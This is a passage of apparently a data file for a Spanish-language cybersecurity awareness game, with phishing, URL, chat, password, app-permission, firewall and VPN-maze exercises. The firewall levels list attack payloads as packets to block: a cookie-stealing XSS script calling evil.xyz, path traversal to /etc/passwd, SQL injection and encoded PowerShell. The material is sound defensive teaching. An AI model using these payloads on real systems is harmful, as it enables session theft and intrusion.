        actualDestinationUrl: 'https://intranet-empresa.com/eventos/agenda-q4',
        isSuspicious: false,
        inspectWarning: 'Dominio corporativo verificado con TLS activo y sin solicitud de credenciales.',
      },
      correctVerdict: 'safe',
      clues: [
        'Autenticación SPF=PASS y DKIM=PASS verificada',
        'No exige contraseñas, pagos ni acciones de pánico',
        'Enlace apunta exactamente al dominio oficial https://intranet-empresa.com',
      ],
      feedback: {
        empathy: 'Tener precaución es excelente, pero también debemos reconocer las comunicaciones legítimas.',
        technicalIndicator:
          'Tanto SPF como DKIM están en PASS, el dominio coincide con la empresa y no solicita datos sensibles.',
        preventiveTip:
          'Cuando la cabecera técnica valida SPF/DKIM en PASS y el mensaje es informativo sin pedir claves, es una comunicación segura.',
      },
    },
  ],

  'url-inspector-1': [
    {
      id: 'ex_url_01',
      type: 'url_inspector',
      title: 'Misión 1/3: Subdominio Trampa',
      instruction: 'Toca el bloque de la URL que revela el verdadero dominio malicioso:',
      suriPrompt: 'Busca el bloque que está inmediatamente a la izquierda de la primera barra "/".',
      suriPoseInitial: 'shield',
      rawUrl: 'https://login.banco-seguro.com.cuentas-validar.xyz/auth',
      segments: [
        { id: 'seg_1', type: 'protocol', text: 'https://', isSuspicious: false },
        { id: 'seg_2', type: 'subdomain', text: 'login.banco-seguro.com.', isSuspicious: false },
        {
          id: 'seg_3',
          type: 'root_domain',
          text: 'cuentas-validar.xyz',
          isSuspicious: true,
          annotation: '¡Trampa de subdominio! El verdadero servidor pertenece a cuentas-validar.xyz',
        },
        { id: 'seg_4', type: 'path', text: '/auth', isSuspicious: false },
      ],
      maliciousSegmentId: 'seg_3',
      attackTechnique: 'deceptive_subdomain',
      hint: 'El dominio real es el que está inmediatamente a la izquierda del primer "/".',
      feedback: {
        empathy: 'Es muy común leer solo el inicio de la dirección web y confiar al ver "banco-seguro.com".',
        technicalIndicator:
          'El dominio raíz real es "cuentas-validar.xyz", camuflado tras un subdominio largo.',
        preventiveTip:
          'Revisa siempre el bloque final antes de la primera barra diagonal "/" para ver la verdadera identidad del sitio.',
      },
    },
    {
      id: 'ex_url_02',
      type: 'url_inspector',
      title: 'Misión 2/3: Ataque de Typosquatting',
      instruction: 'Identifica el segmento donde el atacante aplicó sustitución visual de caracteres:',
      suriPrompt: 'Observa con lupa cada letra del dominio principal de Microsoft.',
      suriPoseInitial: 'idea',
      rawUrl: 'https://login.micr0soft-office.com/es-co/signin',
      segments: [
        { id: 'seg_2_1', type: 'protocol', text: 'https://', isSuspicious: false },
        { id: 'seg_2_2', type: 'subdomain', text: 'login.', isSuspicious: false },
        {
          id: 'seg_2_3',
          type: 'root_domain',
          text: 'micr0soft-office.com',
          isSuspicious: true,
          annotation: '¡Typosquatting! Usa el número cero "0" en "micr0soft" y un guion no oficial.',
        },
        { id: 'seg_2_4', type: 'path', text: '/es-co/signin', isSuspicious: false },
      ],
      maliciousSegmentId: 'seg_2_3',
      attackTechnique: 'typosquatting',
      hint: 'Fíjate si alguna vocal fue sustituida por un número en el nombre de la marca.',
      feedback: {
        empathy: 'El cerebro humano autocompleta las palabras conocidas aunque tengan un número infiltrado.',
        technicalIndicator:
          'El dominio "micr0soft-office.com" reemplaza la primera "o" por un cero "0" para robar credenciales de correo.',
        preventiveTip:
          'Nunca ingreses tus credenciales corporativas desde enlaces recibidos por mensaje; usa tus marcadores seguros.',
      },
    },
    {
      id: 'ex_url_03',
      type: 'url_inspector',
      title: 'Misión 3/3: Protocolo Sin Cifrado en Banca',
      instruction: 'Toca el segmento que expone tus contraseñas en texto plano por la red:',
      suriPrompt: 'Aunque el dominio parezca correcto, fíjate en el protocolo al inicio de la URL.',
      suriPoseInitial: 'shield',
      rawUrl: 'http://sucursal-personas.bancolombia-seguro.com/login',
      segments: [
        {
          id: 'seg_3_1',
          type: 'protocol',
          text: 'http://',
          isSuspicious: true,
          annotation: '¡Protocolo HTTP sin TLS! Cualquier dato enviado viajará en texto plano sin cifrar.',
        },
        { id: 'seg_3_2', type: 'subdomain', text: 'sucursal-personas.', isSuspicious: false },
        { id: 'seg_3_3', type: 'root_domain', text: 'bancolombia-seguro.com', isSuspicious: false },
        { id: 'seg_3_4', type: 'path', text: '/login', isSuspicious: false },
      ],
      maliciousSegmentId: 'seg_3_1',
      attackTechnique: 'insecure_http',
      hint: 'Revisa el primer bloque de protocolo al principio de la barra de direcciones.',
      feedback: {
        empathy: 'A veces pasamos por alto las primeras letras de la URL cuando tenemos prisa.',
        technicalIndicator:
          'El uso de "http://" sin la "s" (TLS/SSL) significa que no hay cifrado ni certificado de autenticidad bancaria.',
        preventiveTip:
          'Ninguna entidad financiera opera portales de autenticación sobre HTTP sin cifrar.',
      },
    },
  ],

  'chat-urgency-1': [
    {
      id: 'ex_chat_01',
      type: 'chat_simulator',
      title: 'Escenario 1/2: Suplantación de Gerencia en WhatsApp',
      instruction: 'El supuesto Lic. Torres te exige un código SMS con urgencia. ¿Cómo actúas?',
      suriPrompt: 'Los atacantes fingen jerarquía y pánico corporativo para que entregues códigos confidenciales.',
      suriPoseInitial: 'idle',
      channel: 'whatsapp',
      attackerContact: {
        displayName: 'Lic. Torres - Gerencia Financiera',
        phoneNumberOrHandle: '+57 312 4509122',
        allegedRole: 'Gerencia Financiera',
        isVerifiedBadge: false,
      },
      psychologicalTrigger: 'urgency',
      rootNodeId: 'node_init',
      dialogueNodes: {
        node_init: {
          id: 'node_init',
          incomingMessages: [
            {
              id: 'm1',
              sender: 'attacker',
              text: 'Hola, cambié mi número personal. Estoy en una junta urgente con la DIAN y el portal bloqueó mi acceso. Pásame rápido el código SMS de 6 dígitos que te acaba de llegar.',
              timestamp: '11:15 AM',
              delayMs: 600,
            },
          ],
          options: [
            {
              id: 'opt_1',
              text: 'Claro Licenciado, aquí está el código: 489-102',
              isSafeChoice: false,
              feedbackImmediate: '¡BRECHA DE SEGURIDAD! Entregaste tu código OTP a un impostor.',
            },
            {
              id: 'opt_2',
              text: 'Por política de seguridad no puedo enviar códigos OTP por chat; lo llamo ya mismo a su extensión interna.',
              isSafeChoice: true,
              feedbackImmediate: '¡Excelente reacción! Aplicaste verificación por canal alterno seguro.',
            },
            {
              id: 'opt_3',
              text: '🚨 [Botón de Pánico: Reportar Intento de Suplantación BEC]',
              isSafeChoice: true,
              isPanicButton: true,
              feedbackImmediate: '¡Protocolo activado! Número bloqueado y reportado al equipo de seguridad.',
            },
          ],
        },
      },
      feedback: {
        empathy: 'Cuando una figura de autoridad exige algo rápido, la presión psicológica es muy fuerte.',
        technicalIndicator:
          'Los códigos OTP de 6 dígitos son personales e intransferibles; compartirlos entrega el control total de tu cuenta.',
        preventiveTip:
          'Valida siempre por llamada interna cualquier solicitud inusual que provenga de un número nuevo.',
      },
    },
    {
      id: 'ex_chat_02',
      type: 'chat_simulator',
      title: 'Escenario 2/2: Falso Soporte TI en Slack',
      instruction: 'Un supuesto técnico de soporte te pide instalar una herramienta de control remoto:',
      suriPrompt: 'Verifica si el canal y la petición cumplen los protocolos de soporte de la empresa.',
      suriPoseInitial: 'shield',
      channel: 'slack',
      attackerContact: {
        displayName: 'Mesa de Ayuda TI - Externo',
        phoneNumberOrHandle: '@soporte-mantenimiento-temp',
        allegedRole: 'Técnico de Infraestructura',
        isVerifiedBadge: false,
      },
      psychologicalTrigger: 'authority',
      rootNodeId: 'node_slack_1',
      dialogueNodes: {
        node_slack_1: {
          id: 'node_slack_1',
          incomingMessages: [
            {
              id: 'ms1',
              sender: 'attacker',
              text: 'Detectamos un fallo crítico en tu antivirus corporativo. Descarga ya este instalador desde mega-parche-ti.xyz y pásame tu contraseña de Windows para configurarlo.',
              timestamp: '02:30 PM',
              delayMs: 600,
            },
          ],
          options: [
            {
              id: 'opts_1',
              text: 'De acuerdo, ya lo descargo y mi clave de equipo es Centinela2026*',
              isSafeChoice: false,
              feedbackImmediate: '¡Compromiso total! Instalaste un troyano y entregaste tu contraseña.',
            },
            {
              id: 'opts_2',
              text: 'Soporte TI nunca pide contraseñas ni usa dominios .xyz externos. Verificaré el ticket en el portal oficial.',
              isSafeChoice: true,
              feedbackImmediate: '¡Defensa impecable! Detectaste la suplantación de soporte técnico.',
            },
          ],
        },
      },
      feedback: {
        empathy: 'Confiar en el equipo técnico de soporte parece lo más natural dentro de una oficina.',
        technicalIndicator:
          'Los departamentos de TI reales gestionan parches mediante políticas centralizadas y jamás piden tu contraseña en texto plano.',
        preventiveTip:
          'Nunca instales programas desde enlaces externos enviados por chat ni compartas tu clave de inicio de sesión.',
      },
    },
  ],

  'attachment-phish-1': [
    {
      id: 'ex_attach_01',
      type: 'inbox_simulator',
      title: 'Misión 1/2: Doble Extensión Trampa (.pdf.exe)',
      instruction: 'Examina esta notificación urgente de cobro y evalúa el archivo adjunto:',
      suriPrompt: 'Fíjate detenidamente en la extensión final del archivo después del último punto.',
      suriPoseInitial: 'idea',
      header: {
        visualSender: 'Facturación Jurídica - Cobro Coactivo',
        actualSender: 'cobros@notificaciones-dian-cobro.online',
        isSenderSpoofed: true,
        spfStatus: 'fail',
        dkimStatus: 'fail',
        receivedTime: '09:14 AM',
      },
      subject: '⚠️ Mandamiento de Pago #48291 - Embargo Preventivo de Cuentas',
      isUrgentFlag: true,
      bodyText:
        'Por orden judicial se ha emitido un mandamiento de pago contra su empresa. Descargue la copia de la demanda adjunta para conocer los términos de comparecencia antes de 24 horas.',
      actionButtonText: '[Abrir Factura_Demanda_48291.pdf.exe]',
      attachment: {
        filename: 'Factura_Demanda_48291.pdf.exe',
        size: '2.4 MB',
        isSuspicious: true,
        inspectWarning: '¡Alerta de archivo ejecutable! Termina en .exe, no es un documento PDF.',
      },
      link: {
        displayedText: 'Factura_Demanda_48291.pdf.exe',
        actualDestinationUrl: 'http://malware-drop.online/Factura_Demanda_48291.pdf.exe',
        isSuspicious: true,
      },
      footnoteWarning: 'Archivo adjunto supuestamente firmado electrónicamente',
      correctVerdict: 'phish',
      clues: [
        'Doble extensión engañosa .pdf.exe',
        'Amenaza de embargo judicial inmediato',
        'Remitente con dominio falso .online y SPF=FAIL',
      ],
      feedback: {
        empathy: 'Los atacantes aprovechan que los sistemas ocultan extensiones conocidas para camuflar ejecutables.',
        technicalIndicator:
          'El archivo se llama "Factura_Demanda_48291.pdf.exe". La extensión real es ".exe", un binario ejecutable.',
        preventiveTip:
          'Activa siempre "Ver extensiones de nombre de archivo" en Windows y jamás abras adjuntos .exe.',
      },
    },
    {
      id: 'ex_attach_02',
      type: 'inbox_simulator',
      title: 'Misión 2/2: Hoja de Cálculo con Macros Maliciosas (.xlsm)',
      instruction: 'Revisa este correo de un supuesto proveedor nuevo que pide habilitar macros:',
      suriPrompt: 'Los archivos .xlsm o .docm que exigen "Habilitar Contenido" ejecutan scripts ocultos en tu PC.',
      suriPoseInitial: 'shield',
      header: {
        visualSender: 'Logística Internacional Express',
        actualSender: 'envios@carga-aduanas-global.top',
        isSenderSpoofed: true,
        spfStatus: 'fail',
        dkimStatus: 'fail',
        receivedTime: '03:50 PM',
      },
      subject: 'Guía de Despacho Aduanero #9920 - Habilitar Macros para Ver',
      isUrgentFlag: true,
      bodyText:
        'Adjuntamos la liquidación de impuestos de importación. IMPORTANTE: Al abrir el archivo en Excel, haga clic en el botón amarillo "Habilitar Edición y Habilitar Contenido (Macros)" para desencriptar la factura.',
      actionButtonText: '[Descargar Liquidacion_Aduana_9920.xlsm]',
      attachment: {
        filename: 'Liquidacion_Aduana_9920.xlsm',
        size: '1.8 MB',
        isSuspicious: true,
        inspectWarning: 'Archivo con Macros VBA activas (.xlsm) proveniente de remitente externo no verificado.',
      },
      link: {
        displayedText: 'http://carga-aduanas-global.top/Liquidacion.xlsm',
        actualDestinationUrl: 'http://carga-aduanas-global.top/Liquidacion.xlsm',
        isSuspicious: true,
      },
      correctVerdict: 'phish',
      clues: [
        'Exige pulsar "Habilitar Contenido / Macros" para ejecutar código VBA oculto',
        'Dominio desconocido .top con fallo en SPF y DKIM',
      ],
      feedback: {
        empathy: 'El pretexto de que el documento está "protegido y requiere habilitar contenido" engaña a muchos profesionales.',
        technicalIndicator:
          'Las macros VBA (.xlsm / .docm) pueden ejecutar comandos de PowerShell en segundo plano para descargar ransomware.',
        preventiveTip:
          'Nunca habilites macros en documentos recibidos desde fuera de tu organización.',
      },
    },
  ],

  'rapid-triage-1': [
    {
      id: 'ex_triage_01',
      type: 'rapid_triage',
      title: 'Jefe Módulo 1: Radar de Ataques Relámpago',
      instruction: 'Evalúa a toda velocidad cada situación antes de que el radar de 7 segundos expire:',
      suriPrompt: '¡Mantén la velocidad de carrera centinela! Tienes 7 segundos por amenaza.',
      suriPoseInitial: 'running',
      timeLimitSeconds: 7,
      requiredCorrectPass: 4,
      cards: [
        {
          id: 'card_a_dhl',
          category: 'sms',
          title: 'Notificación SMS de Paquetería',
          senderSnippet: '+1 (800) DHL-ALERT',
          bodySnippet: 'Tu paquete DHL tiene un recargo de $1.50 USD. Paga aquí: bit.ly/dhl-track-9',
          isThreat: true,
          indicatorText: 'Enlace acortado bit.ly con cobro imprevisto vía SMS (Smishing).',
        },
        {
          id: 'card_b_flash',
          category: 'push_alert',
          title: 'Ventana Emergente de Navegador',
          senderSnippet: 'chrome-alerta.stream-player.xyz',
          bodySnippet: 'Chrome requiere actualizar tu Flash Player para reproducir este video.',
          isThreat: true,
          indicatorText: 'Adobe Flash Player fue descontinuado en 2020. Es un instalador de troyano.',
        },
        {
          id: 'card_c_google',
          category: 'email',
          title: 'Aviso de Seguridad de Cuenta',
          senderSnippet: 'no-reply@accounts.google.com',
          bodySnippet: 'Aviso de inicio de sesión habitual en tu dispositivo conocido.',
          isThreat: false,
          indicatorText: 'Dominio verificado @accounts.google.com informando actividad legítima sin pedir contraseñas.',
        },
        {
          id: 'card_d_support',
          category: 'sms',
          title: 'Mensaje de Soporte Técnico',
          senderSnippet: 'Soporte-Móvil-Directo',
          bodySnippet: 'Por favor indícanos tu código de 6 dígitos que te enviamos al móvil para verificar que eres tú.',
          isThreat: true,
          indicatorText: 'Ningún soporte técnico legítimo solicita tu código OTP confidencial.',
        },
      ],
      feedback: {
        empathy: 'Bajo presión de tiempo es fácil caer en impulsos automáticos.',
        technicalIndicator:
          'Los atacantes usan SMS con enlaces acortados (bit.ly), descargas falsas de Flash y peticiones de códigos OTP.',
        preventiveTip:
          'Nunca abras enlaces SMS de paquetería inesperada y jamás compartas códigos de 6 dígitos.',
      },
    },
  ],

  // ---------------------------------------------------------------------------
  // CURSO 2: CRIPTOGRAFÍA, IDENTIDAD ZERO TRUST Y FIREWALL ARCADE
  // ---------------------------------------------------------------------------
  'password-builder-1': [
    {
      id: 'ex_pwd_01',
      type: 'password_builder',
      title: 'Misión 1/2: Bóveda de Correo Corporativo (>400 años)',
      instruction: 'Construye una frase de paso (passphrase) cuya resistencia supere los 400 años ante el Robot Cracker:',
      suriPrompt: 'Combina palabras aleatorias largas y símbolos; evita sustituciones obvias como P@ssw0rd.',
      suriPoseInitial: 'idea',
      targetCrackYears: 400,
      minEntropyRequired: 65,
      contextScenario: 'Protege las credenciales de administración del correo corporativo y la banca PYME',
      availableTokens: [
        { id: 'tok_caballo', text: 'Caballo', label: 'Caballo', category: 'passphrase_word', entropyContributionBits: 22 },
        { id: 'tok_reloj', text: 'Reloj', label: 'Reloj', category: 'passphrase_word', entropyContributionBits: 20 },
        { id: 'tok_num', text: '#89', label: '#89', category: 'special_char', entropyContributionBits: 18 },
        { id: 'tok_platano', text: 'Plátano', label: 'Plátano', category: 'passphrase_word', entropyContributionBits: 22 },
        { id: 'tok_pass', text: 'P@ss', label: 'P@ss', category: 'predictable_pattern', entropyContributionBits: 4 },
        { id: 'tok_word', text: 'w0rd', label: 'w0rd', category: 'predictable_pattern', entropyContributionBits: 4 },
        { id: 'tok_123', text: '123', label: '123', category: 'predictable_pattern', entropyContributionBits: 2 },
        { id: 'tok_2026', text: '!2026', label: '!2026', category: 'predictable_pattern', entropyContributionBits: 6 },
      ],
      feedback: {
        empathy: 'Solemos creer que cambiar letras por números como "P@ssw0rd123" es seguro, pero los diccionarios automatizados las descifran al instante.',
        technicalIndicator:
          'Una frase de paso con palabras no relacionadas y caracteres especiales supera los 75 bits de entropía.',
        preventiveTip:
          'Utiliza frases de contraseña (Passphrases) largas compuestas por palabras aleatorias.',
      },
    },
    {
      id: 'ex_pwd_02',
      type: 'password_builder',
      title: 'Misión 2/2: Llave Maestra del Servidor Cloud (>1,000 años)',
      instruction: 'Ensambla una llave criptográfica de alta entropía (>75 bits) para la consola AWS/Firebase de la empresa:',
      suriPrompt: 'Descarta los nombres de empresa o años actuales; selecciona únicamente bloques de alta entropía.',
      suriPoseInitial: 'shield',
      targetCrackYears: 1000,
      minEntropyRequired: 75,
      contextScenario: 'Protección de la cuenta raíz de infraestructura en la nube de la organización',
      availableTokens: [
        { id: 'tok_2_volcan', text: 'Volcán', label: 'Volcán', category: 'passphrase_word', entropyContributionBits: 24 },
        { id: 'tok_2_orbit', text: 'Órbita', label: 'Órbita', category: 'passphrase_word', entropyContributionBits: 24 },
        { id: 'tok_2_sym', text: '$74!', label: '$74!', category: 'special_char', entropyContributionBits: 20 },
        { id: 'tok_2_cobalto', text: 'Cobalto', label: 'Cobalto', category: 'passphrase_word', entropyContributionBits: 24 },
        { id: 'tok_2_admin', text: 'Admin', label: 'Admin', category: 'predictable_pattern', entropyContributionBits: 3 },
        { id: 'tok_2_empresa', text: 'MiPyme', label: 'MiPyme', category: 'predictable_pattern', entropyContributionBits: 5 },
        { id: 'tok_2_qwerty', text: 'qwerty', label: 'qwerty', category: 'predictable_pattern', entropyContributionBits: 1 },
      ],
      feedback: {
        empathy: 'Incluir el nombre de la empresa o la palabra "Admin" reduce drásticamente la resistencia ante ataques dirigidos.',
        technicalIndicator:
          'Al combinar "Volcán + Órbita + $74! + Cobalto" superas los 90 bits de entropía efectiva.',
        preventiveTip:
          'Nunca incluyas el nombre de tu empresa, ciudad o año actual dentro de tus contraseñas corporativas.',
      },
    },
  ],

  'permission-swipe-1': [
    {
      id: 'ex_perm_01_calc',
      type: 'permission_swipe',
      title: 'Misión 1/3: Calculadora Simple Pro',
      instruction: 'Examina los permisos solicitados y decide si DENEGAR o AUTORIZAR:',
      suriPrompt: 'Pregúntate: ¿una calculadora necesita escuchar tu voz o rastrear tus contactos?',
      suriPoseInitial: 'shield',
      appInfo: {
        name: 'Calculadora Simple Pro',
        category: 'Productividad / Matemáticas',
        iconUrl: 'calculate',
        statedPurpose: 'Cálculos aritméticos y científicos rápidos.',
      },
      requestedPermissions: [
        {
          id: 'p_mic',
          type: 'microphone',
          title: 'Grabar Audio / Micrófono',
          icon: 'mic',
          isJustifiedForFunction: false,
          riskSeverity: 'critical',
          riskExplanation: 'Peligro de escucha no autorizada en reuniones de trabajo.',
        },
        {
          id: 'p_contacts',
          type: 'contacts',
          title: 'Acceso a Libreta de Contactos',
          icon: 'contacts',
          isJustifiedForFunction: false,
          riskSeverity: 'high',
          riskExplanation: 'Filtración de teléfonos y correos corporativos.',
        },
      ],
      expectedVerdict: 'deny',
      feedback: {
        empathy: 'Es muy tentador aceptar todos los permisos rápidamente para empezar a usar la app.',
        technicalIndicator:
          'Una calculadora jamás necesita micrófono ni contactos. Estos permisos ocultan spyware.',
        preventiveTip:
          'Deniega permisos innecesarios o desinstala aplicaciones utilitarias que pidan acceso a sensores.',
      },
    },
    {
      id: 'ex_perm_02_photo',
      type: 'permission_swipe',
      title: 'Misión 2/3: Editor de Fotografía Filtros HD',
      instruction: 'Examina los permisos solicitados y decide si otorgar o denegar:',
      suriPrompt: 'Evalúa si el permiso corresponde directamente a la funcionalidad principal de la app.',
      suriPoseInitial: 'idea',
      appInfo: {
        name: 'Editor de Fotografía Filtros HD',
        category: 'Diseño y Fotografía',
        iconUrl: 'photo_camera',
        statedPurpose: 'Retoque de imágenes, aplicación de filtros y guardado en galería.',
      },
      requestedPermissions: [
        {
          id: 'p_storage',
          type: 'storage',
          title: 'Acceso a Fotos y Galería',
          icon: 'photo_library',
          isJustifiedForFunction: true,
          riskSeverity: 'low',
          riskExplanation: 'Estrictamente necesario para abrir y guardar las fotos que el usuario edita.',
        },
      ],
      expectedVerdict: 'allow',
      feedback: {
        empathy: 'El escepticismo es bueno, pero las aplicaciones requieren permisos coherentes con su labor.',
        technicalIndicator:
          'El acceso a galería es legítimo y necesario para un editor fotográfico.',
        preventiveTip:
          'Autoriza únicamente los permisos indispensables y prefiere "Solo mientras la app esté en uso".',
      },
    },
    {
      id: 'ex_perm_03_torch',
      type: 'permission_swipe',
      title: 'Misión 3/3: Linterna Ultra Brillante',
      instruction: 'Examina los permisos solicitados y toma tu decisión de seguridad:',
      suriPrompt: '¡Alerta centinela! Cuidado con las herramientas básicas que piden acceso a tus SMS.',
      suriPoseInitial: 'shield',
      appInfo: {
        name: 'Linterna Ultra Brillante',
        category: 'Herramientas',
        iconUrl: 'flashlight_on',
        statedPurpose: 'Encender el flash LED del dispositivo.',
      },
      requestedPermissions: [
        {
          id: 'p_sms',
          type: 'sms',
          title: 'Enviar y Leer mensajes SMS',
          icon: 'sms',
          isJustifiedForFunction: false,
          riskSeverity: 'critical',
          riskExplanation: 'Peligro crítico: permite interceptar códigos bancarios OTP.',
        },
      ],
      expectedVerdict: 'deny',
      feedback: {
        empathy: 'Las apps de linterna fueron de los primeros vehículos masivos de troyanos bancarios.',
        technicalIndicator:
          'Una linterna solo controla el LED. Exigir lectura de SMS busca robar códigos 2FA.',
        preventiveTip:
          'Utiliza siempre la linterna nativa del sistema operativo de tu teléfono.',
      },
    },
  ],

  'firewall-arcade-1': [
    {
      id: 'ex_fw_01',
      type: 'firewall_arcade',
      title: 'Videojuego: Bastión Cortafuegos Nivel 1',
      instruction: 'Defiende el servidor PYME en los 3 carriles: PERMITE el tráfico seguro y BLOQUEA los ataques con Pulso EMP.',
      suriPrompt: 'Usa [W] / Botón Verde para permitir HTTPS :443 y DNS :53; usa [Espacio] / Botón Rojo para destruir ataques.',
      suriPoseInitial: 'shield',
      firewallRuleBanner: 'REGLA ACTIVA: Permite HTTPS (:443) y DNS (:53) legítimos. Bloquea SQLi, SSH Brute (:22) y Malware .exe',
      serverMaxHp: 100,
      requiredScoreToWin: 300,
      packets: [
        {
          id: 'pkt_1',
          protocolLabel: 'HTTPS :443 (TLS 1.3)',
          sourceIp: '190.24.10.12',
          payloadPreview: 'GET /api/catalogo-productos HTTP/2',
          lane: 1,
          isMalicious: false,
          speedTier: 'normal',
          explanation: 'Petición web cifrada legítima de un cliente hacia el catálogo.',
        },
        {
          id: 'pkt_2',
          protocolLabel: 'HTTP :80 SQL Injection',
          sourceIp: '45.133.99.2',
          payloadPreview: "POST /login user=admin' OR 1=1 --",
          lane: 0,
          isMalicious: true,
          speedTier: 'normal',
          explanation: "Inyección SQL clásica (' OR 1=1 --) para evadir autenticación.",
        },
        {
          id: 'pkt_3',
          protocolLabel: 'DNS :53 Consulta Segura',
          sourceIp: '8.8.8.8',
          payloadPreview: 'QUERY A intranet.mipyme.co',
          lane: 2,
          isMalicious: false,
          speedTier: 'normal',
          explanation: 'Resolución DNS estándar necesaria para la conectividad.',
        },
        {
          id: 'pkt_4',
          protocolLabel: 'SSH :22 Brute Force',
          sourceIp: '185.220.101.7',
          payloadPreview: 'AUTH root:123456 (Attempt #4,892)',
          lane: 1,
          isMalicious: true,
          speedTier: 'fast',
          explanation: 'Ataque automatizado de fuerza bruta por diccionario al puerto 22.',
        },
        {
          id: 'pkt_5',
          protocolLabel: 'SMB :445 Troyano Drop',
          sourceIp: '91.214.12.88',
          payloadPreview: 'UPLOAD factura_cobro.pdf.exe',
          lane: 0,
          isMalicious: true,
          speedTier: 'fast',
          explanation: 'Intento de inyectar un ejecutable .pdf.exe por puerto SMB.',
        },
      ],
      feedback: {
        empathy: 'En un perímetro real los paquetes seguros y los ataques llegan mezclados cada segundo.',
        technicalIndicator:
          'Filtrar correctamente el puerto 443/53 y bloquear patrones de SQL Injection ("OR 1=1") y fuerza bruta SSH (:22) mantiene intacto el servidor.',
        preventiveTip:
          'Configura siempre un WAF (Web Application Firewall) y bloquea el acceso público directo al puerto 22 (SSH) y 445 (SMB).',
      },
    },
  ],

  'firewall-arcade-2': [
    {
      id: 'ex_fw_02',
      type: 'firewall_arcade',
      title: 'Jefe Módulo 2: Tormenta DDoS & WAF Zero Trust',
      instruction: 'Oleada de alta velocidad: filtra ataques XSS, Path Traversal y Botnets sin bloquear las ventas reales.',
      suriPrompt: '¡Velocidad de Jefe! Observa el payload de cada paquete antes de que toque la línea del Firewall.',
      suriPoseInitial: 'running',
      firewallRuleBanner: 'REGLA WAF: Permite pagos y API con TLS 1.3. Destruye XSS (<script>), Path Traversal (../) y DDoS SYN Flood',
      serverMaxHp: 100,
      requiredScoreToWin: 400,
      packets: [
        {
          id: 'pkt_b1',
          protocolLabel: 'HTTPS :443 Pago Stripe',
          sourceIp: '181.50.22.19',
          payloadPreview: 'POST /checkout token=tok_visa_verified',
          lane: 0,
          isMalicious: false,
          speedTier: 'fast',
          explanation: 'Transacción legítima de pago cifrada con token verificado.',
        },
        {
          id: 'pkt_b2',
          protocolLabel: 'XSS Payload Attack',
          sourceIp: '103.14.22.91',
          payloadPreview: '<script>fetch("http://evil.xyz?c="+document.cookie)</script>',
          lane: 1,
          isMalicious: true,
          speedTier: 'fast',
          explanation: 'Ataque Cross-Site Scripting (XSS) diseñado para robar cookies de sesión.',
        },
        {
          id: 'pkt_b3',
          protocolLabel: 'Path Traversal Exploit',
          sourceIp: '77.83.19.44',
          payloadPreview: 'GET /download?file=../../../../etc/passwd',
          lane: 2,
          isMalicious: true,
          speedTier: 'fast',
          explanation: 'Intento de escalar directorios (../) para leer archivos internos del servidor.',
        },
        {
          id: 'pkt_b4',
          protocolLabel: 'HTTPS :443 Portal Nómina',
          sourceIp: '190.85.11.4',
          payloadPreview: 'GET /rrhh/colilla-pago JWT=OK_MFA',
          lane: 1,
          isMalicious: false,
          speedTier: 'fast',
          explanation: 'Consulta interna autenticada con JWT y MFA válido.',
        },
        {
          id: 'pkt_b5',
          protocolLabel: 'TCP SYN_FLOOD Botnet',
          sourceIp: '0.0.0.0/Spoofed',
          payloadPreview: 'SYN_FLOOD 95,000 pps -> Saturar RAM',
          lane: 0,
          isMalicious: true,
          speedTier: 'boss',
          explanation: 'Inundación DDoS SYN Flood que busca agotar las conexiones del servidor.',
        },
        {
          id: 'pkt_b6',
          protocolLabel: 'RCE Shell Injection',
          sourceIp: '194.26.135.8',
          payloadPreview: 'cmd.exe /c powershell -enc JABzAD0ATgBlAHcA',
          lane: 2,
          isMalicious: true,
          speedTier: 'boss',
          explanation: 'Intento de ejecución remota de comandos (RCE) con PowerShell ofuscado.',
        },
      ],
      feedback: {
        empathy: 'Los ataques modernos de capa 7 imitan peticiones web normales pero inyectan scripts o comandos ocultos.',
        technicalIndicator:
          'Detectar etiquetas <script> (XSS), rutas ../ (Path Traversal) y comandos powershell codificados detiene la intrusión en el borde.',
        preventiveTip:
          'Combina reglas WAF automatizadas con validación estricta de entradas en el backend y protección anti-DDoS en el CDN.',
      },
    },
  ],

  // ---------------------------------------------------------------------------
  // CURSO 3: REDES SEGURAS, WI-FI PÚBLICO Y LABERINTO VPN 2D
  // ---------------------------------------------------------------------------
  'network-maze-1': [
    {
      id: 'ex_maze_01',
      type: 'network_maze',
      title: 'Videojuego: Operación Túnel VPN en Cafetería',
      instruction: 'Mueve a Suri con WASD o el D-Pad: activa el Escudo VPN 🛡️, recoge los 2 paquetes 📦 y llega al Servidor 🖥️.',
      suriPrompt: '¡No pises los Sniffers rojos sin haber tomado primero el Escudo VPN azul!',
      suriPoseInitial: 'running',
      missionObjective: '1° Toma el Escudo VPN 🛡️ -> 2° Recoge los 2 Paquetes 📦 -> 3° Entra al Servidor 🖥️ esquivando el Wi-Fi Falso.',
      gridRows: 5,
      gridCols: 5,
      requireVpnBeforeGoal: true,
      requireMfaBeforeGoal: false,
      grid: [
        ['start', 'empty', 'vpn_shield', 'wall', 'data_packet'],
        ['wall', 'wall', 'empty', 'sniffer_trap', 'empty'],
        ['data_packet', 'empty', 'empty', 'wall', 'empty'],
        ['empty', 'evil_twin_ap', 'wall', 'empty', 'empty'],
        ['empty', 'empty', 'empty', 'sniffer_trap', 'server_goal'],
      ],
      hazardsLegend: [
        {
          cellType: 'vpn_shield',
          name: 'Escudo VPN AES-256',
          description: 'Cifra tu tráfico para poder cruzar frente a Sniffers sin sufrir robo de datos.',
        },
        {
          cellType: 'sniffer_trap',
          name: 'Sniffer Man-in-the-Middle',
          description: 'Intercepta tus datos si pasas sin haber activado primero la VPN.',
        },
        {
          cellType: 'evil_twin_ap',
          name: 'Wi-Fi "Evil Twin" Falso',
          description: 'Red clonada por un atacante; debes rodearla siempre.',
        },
      ],
      feedback: {
        empathy: 'Trabajar desde una cafetería o aeropuerto parece inofensivo porque el Wi-Fi funciona rápido.',
        technicalIndicator:
          'Sin un túnel VPN activo, cualquier Sniffer en la misma red local puede capturar tus paquetes en tránsito.',
        preventiveTip:
          'Enciende siempre la VPN corporativa como primer paso antes de abrir cualquier aplicación o documento de trabajo en redes públicas.',
      },
    },
  ],

  'network-maze-2': [
    {
      id: 'ex_maze_02',
      type: 'network_maze',
      title: 'Videojuego: Red Zero Trust (VPN + Llave MFA)',
      instruction: 'Supera el mapa corporativo 6x6: necesitas el Escudo VPN 🛡️, la Llave MFA 🔑 y los 3 Paquetes 📦.',
      suriPrompt: 'El Servidor Zero Trust solo abrirá su compuerta cuando tengas VPN + MFA + 3 Paquetes.',
      suriPoseInitial: 'shield',
